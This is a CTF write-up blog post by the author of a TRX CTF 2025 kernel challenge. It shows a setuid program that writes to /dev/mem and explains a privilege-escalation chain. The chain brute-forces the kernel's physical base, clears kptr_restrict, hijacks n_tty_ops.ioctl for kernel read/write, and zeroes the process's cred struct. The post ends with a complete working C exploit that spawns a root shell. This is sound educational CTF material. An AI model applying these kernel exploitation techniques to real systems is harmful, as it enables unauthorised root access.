+++
title = '/dev/mem - TRX CTF 2025'
date = 2025-08-20T15:57:29+02:00
draft = false
author = 'prosti'
summary = 'kernel pwn challenge that I wrote for TRX CTF 2025'
tags = [
    'linux',
]
toc = true
+++

## Author’s Note

The challenge can be solved in lots of different ways! The objective of the challenge is to explore different paths so it should be beginner friendly. The path here explained is pretty straight forward and hopefully you will understand it. 

If you want to share your exploit you can contact me on discord (handle down below!).

## Challenge

```c
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <err.h>

#define DEV "/dev/mem"

#define PAGE_SIZE 0x1000
#define GET_PAGE_BASE(address) address & ~(PAGE_SIZE-1)
#define GET_OFFSET(address) address & (PAGE_SIZE-1) 

__attribute__((constructor)) void init();
int get_long(char* str, unsigned long* value);
int physical_write(int dev, unsigned long address, unsigned long value);

__attribute__((constructor))
void init(){
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    setbuf(stdin, NULL);
}

int get_long(char* str, unsigned long* value){
    char* check;

    *value = strtoul(str, &check, 16);

    if(check == str)
        return 1;
    
    return 0;
}

int physical_write(int dev, unsigned long address, unsigned long value){
    int br;

    if(lseek(dev, address, SEEK_SET) == -1)
        return 1;

    br = write(dev, &value, sizeof(unsigned long));

    if(br == -1)
        return 1;
    
    return 0;
}

int main(int argc, char **argv){
    unsigned long address, value;
    int dev, check;

    dev = open(DEV, O_RDWR | O_SYNC);
    if(dev == -1)
        err(1, "could not open " DEV);

    if(argc != 3) {
        puts("./chall <address> <value>");
        return 1;
    }
    
    check = get_long(argv[1], &address);
    if(check || (address & (sizeof(unsigned long)-1)) != 0){
        puts("invalid address");
        return 1;
    }

    check = get_long(argv[2], &value);
    if(check){
        puts("invalid value");
        return 1;
    }

    if(physical_write(dev, address, value) != 0)
        err(1, "could not interact with " DEV);

    close(dev);
    return 0;
}
```

## Challenge setup

The objective of the challenge was to gain root and read **/flag.txt** by interacting with the vulnerable program **/usr/sbin/chall** owned by root, only executable by other users and with the setuid flag set (look at **/init** for more information). The privileged binary lets the user write 8 bytes per run in a 8 byte aligned physical address by interacting with **/dev/mem**.

### /dev/mem

This character device enables root users to read and write into memory using physical memory addresses. In this case **CONFIG_STRICT_DEVMEM** is disabled but **CONFIG_HARDENED_USERCOPY** is enabled, this means that you can primarily write in the kernel’s **.data** section. You cannot write into read only mappings because the 16th bit of **CR0** (write protect) is enabled.

## Exploitation overview

There are many different path to solve the challenge. I’ve personally found a path that unfortunately did not work in the end on the remote instances of the challenge (more information at the end) so in this write-up I will describe **@Erge**’s exploit (shout out to him!). The objective is to overwrite the exploit’s **cred** struct and gain root privileges. Be careful! **CONFIG_STATIC_USERMODEHELPER** is enabled so you cannot overwrite **modprobe_path** to privesc.

We can divide the exploit in a few simple steps:

1. Find the physical base of the kernel (aka the start of the kernel’s **.text** area)
2. Find the virtual base of the kernel. This will be useful to locate gadgets and the **init_cred** symbol that will be used in the next steps.
3. Overwrite function pointers or vtables in kernel memory
4. Gain arbitrary virtual memory read and write
5. Traverse the linked list of task structures to overwrite the exploit’s cred struct

### Step 1

For the first step some brute force is required. The physical base of the kernel will randomized above the physical address **CONFIG_PHYSICAL_START** (0x1000000, look at kernel.config) and it has to be **CONFIG_PHYSICAL_ALIGN** (0x200000) bytes aligned. For more information on physical address randomization read [this](https://www.interruptlabs.co.uk/articles/pipe-buffer) article. 

To find the base we can just write 8 bytes at every **CONFIG_PHYSICAL_START** * **CONFIG_PHYSICAL_ALIGN** * **counter** + (**modprobe_path** offset) address until we overwrite modprobe_path. To check if modprobe_path was actually overwritten, we can just read the value in **/proc/sys/kernel/modprobe** after each write. The best way to brute force the address is to start from a high address and go to a lower address. If you try the other way around you will try to overwrite memory in the **.text** or **.rodata** area and cause a kernel panic.

### Step 2

Once you locate the physical base of the address you can effectively overwrite any variable in the **.data** section. After a bit of brainstorming I found the perfect variable to overwrite: **kptr_restrict**. By setting it to zero we can just read **/proc/kallsyms** and read the virtual address of the kernel’s base!

### Step 3

At this point **@Erge** found a great vtable to overwrite: **n_tty_ops** .

```c
static struct tty_ldisc_ops n_tty_ops = {
	.owner		 = THIS_MODULE,
	.num		 = N_TTY,
	.name            = "n_tty",
	.open            = n_tty_open,
	.close           = n_tty_close,
	.flush_buffer    = n_tty_flush_buffer,
	.read            = n_tty_read,
	.write           = n_tty_write,
	.ioctl           = n_tty_ioctl,
	.set_termios     = n_tty_set_termios,
	.poll            = n_tty_poll,
	.receive_buf     = n_tty_receive_buf,
	.write_wakeup    = n_tty_write_wakeup,
	.receive_buf2	 = n_tty_receive_buf2,
	.lookahead_buf	 = n_tty_lookahead_flow_ctrl,
};
```

By overwriting the pointer to **n_tty_ops.ioctl** we gain **rip** control.

### Step 4

The two gadgets used for virtual arbitrary read and write are (**careful:** these are not exactly the same gadgets but their simplified version):

```nasm
; read gadget
mov rax, [rdx]
...
ret

; write gadget
mov [rdx], ebx
...
ret
```

These were found with [kropr](https://github.com/zolutal/kropr).

### Step 5

Well at this point, the solution is trivial. We can just traverse the task structures starting from **init_task** and checking, for each iteration, if the task’s **uid** is the same as the exploit’s task!

```c
struct task_struct {
	...
	
	/* Contains pointers to previous and next task */
	struct list_head		tasks;
	
	...
	
	/* Process id */
	pid_t				pid;
	pid_t				tgid;
	
	...

	/* Tracer's credentials at attach: */
	const struct cred __rcu		*ptracer_cred;

	/* Objective and real subjective task credentials (COW): */
	const struct cred __rcu		*real_cred;

	/* Effective (overridable) subjective task credentials (COW): */
	const struct cred __rcu		*cred;
	
	...
	
};
```

```c
struct cred {
	atomic_long_t	usage;
	kuid_t		uid;		/* real UID of the task */
	kgid_t		gid;		/* real GID of the task */
	kuid_t		suid;		/* saved UID of the task */
	kgid_t		sgid;		/* saved GID of the task */
	kuid_t		euid;		/* effective UID of the task */
	kgid_t		egid;		/* effective GID of the task */
	kuid_t		fsuid;		/* UID for VFS ops */
	kgid_t		fsgid;		/* GID for VFS ops */
	
	...
	
	};
} __randomize_layout;
```

## Exploit

```c
#define _GNU_SOURCE
#define __USE_MISC

#include <stdio.h>
#include <stdlib.h>
#include <signal.h> 
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <assert.h>

#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <poll.h>
#include <sys/mman.h>

#include <sys/timerfd.h>

#define TASKS_OFF 0x900
#define CRED_OFF 0xbe0
#define PID_OFF 0x9d0
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sched.h>

int fd;

int check_modprobe() {
    char buf[0x50];
    FILE *fp = fopen("/proc/sys/kernel/modprobe", "r");
    fread(buf, 0x50, 1, fp);

    if (strcmp(buf, "/usr/sbin/modprobe\n") != 0) {
        puts("WON");
        puts(buf);
        return 1;
    }
    return 0;
}

u_int64_t get_kbase() {
    char buf[0x20];
    u_int64_t kbase=0;

    FILE *fp = popen("grep modprobe_path /proc/kallsyms", "r");
    
    fgets(buf, 17, fp);
    sscanf(buf, "%lx", &kbase);
    kbase -= 0x1dc6c20;

    return kbase;
}

u_int32_t naked_ioctl(int fd, int cmd, u_int64_t arg){
    asm volatile (
        ".intel_syntax noprefix\n"
        "mov rdx, %2\n"
        "mov esi, %1\n"
        "mov edi, %0\n"
        "mov rax, 0x10\n"
        "syscall\n"
        ".att_syntax prefix\n"
        :
        : "r" (fd), "r" (cmd), "r" (arg)
        : "rax", "edi", "esi", "rdx"
    );
}

void win(void)
{       
    printf("[+] current uid = %u, current eid = %u\n", getuid(), geteuid());
    setuid(0);
    int fd = open("/flag.txt", O_RDONLY);
    char buf[0x100];
    read(fd, buf, 0x100);
    puts(buf);
    system("/bin/sh");
    while(1){}
}

void pin_cpu(int core){
	cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(core, &cpu);
    sched_setaffinity(0, sizeof(cpu_set_t), &cpu);
}

u_int32_t aar32(u_int64_t where) {
    return naked_ioctl(fd, 0, where);   
}

void aaw32(u_int64_t where, u_int32_t what) {
    naked_ioctl(fd, what, where);   
}

u_int64_t aar64(u_int64_t where) {
    return (((u_int64_t)aar32(where+4))<<32) + (u_int64_t)aar32(where); 
}

int main() {
    pin_cpu(0);
    
    char cmd[0x100];
    u_int64_t modprobe = 0x300c6c20;
		
		// find the physical address of the kernel's base
    while (1) {
        sprintf(cmd, "/usr/sbin/chall 0x%lx 0x%lx", modprobe, 0x782f706d742f);
        puts(cmd);
        system(cmd);

        if (check_modprobe())
            break;

        modprobe -= 0x100000;
    }
    
    // overwrite kptr_restrict
    u_int64_t kptr_restrict = modprobe + 0x22ddc0;
    sprintf(cmd, "/usr/sbin/chall 0x%lx 0x%lx", kptr_restrict, 0x0);
    system(cmd);
		
		// leak virtual address of kbase
    u_int64_t kbase = get_kbase();
    printf("[KBASE] 0x%lx\n", kbase);
  
	  // gadgets
    u_int64_t AAR = 0x10987df + kbase;
    u_int64_t AAW = 0x109fb3d + kbase;
    u_int64_t INIT_TASK = 0x1c0d0c0 + kbase;
  
		fd = open("/dev/ptmx", O_NOCTTY | O_RDONLY);
		
		// overwrite tty_n_ops.ioctl
    u_int64_t tty_ioctl = modprobe + 0x1388d0 + 24 + 16;
    sprintf(cmd, "/usr/sbin/chall 0x%lx 0x%lx", tty_ioctl, AAR);
    system(cmd);

    // traverse task_struct linked list
    u_int64_t curr = INIT_TASK;
    u_int32_t target_pid = getpid();
    while (1) {
        curr = aar64(curr+TASKS_OFF) - TASKS_OFF;
        printf("CURR TASK 0x%lx\n", curr);
        u_int32_t pid = aar32(curr+PID_OFF);
        printf("CURR PID 0x%x\n", pid);

        if (pid == target_pid) {
            printf("TARGET TASK 0x%lx\n", curr);
            u_int64_t cred = aar64(curr+CRED_OFF);
            printf("CRED STRUCT 0x%lx\n", cred);
            sprintf(cmd, "/usr/sbin/chall 0x%lx 0x%lx", tty_ioctl, AAW);
            system(cmd);

            for (int i=1; i<10; i++)
                aaw32(cred+i*4, 0);
                
            sprintf(cmd, "/usr/sbin/chall 0x%lx 0x%lx", tty_ioctl, kbase+0xc786c0);
            system(cmd);
            win();
            exit(0);
        }        
    }

    return 0;
}
```

## Final notes

If you have any problems understanding the exploit you can contact me on discord (**@.prosti.**).

I will eventually release my initial exploit for the challenge, even if it doesn’t work on the remote servers, as I find it interesting and could help you for future challenges. The first two steps of the exploit are almost the same as this exploit.

Special thanks to **@Erge** for finding this path!
